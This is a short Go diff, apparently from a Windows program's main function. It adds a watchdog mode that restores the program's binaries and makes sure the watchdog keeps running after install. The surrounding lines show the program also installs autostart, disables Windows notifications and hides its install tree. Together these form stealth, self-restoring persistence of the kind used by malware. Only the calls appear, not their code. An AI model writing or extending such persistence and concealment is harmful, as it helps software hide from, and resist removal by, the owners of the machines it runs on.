@@ -879,6 +879,12 @@ func superviseUntilBreak() {
 
 func main() {
 	initPaths()
+	if wantsWatchdogMode() {
+		// Watchdog does not need full config to restore binaries; best-effort load.
+		_ = loadConfig()
+		runWatchdog()
+		return
+	}
 	if err := loadConfig(); err != nil {
 		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
 		os.Exit(1)
@@ -886,6 +892,7 @@ func main() {
 	acquireLock()
 	ensureHelperPresent()
 	info := installAutostart()
+	ensureWatchdogRunning()
 	disableWindowsNotifications()
 	hideInstallTree()
 	port, err := findFreePort()
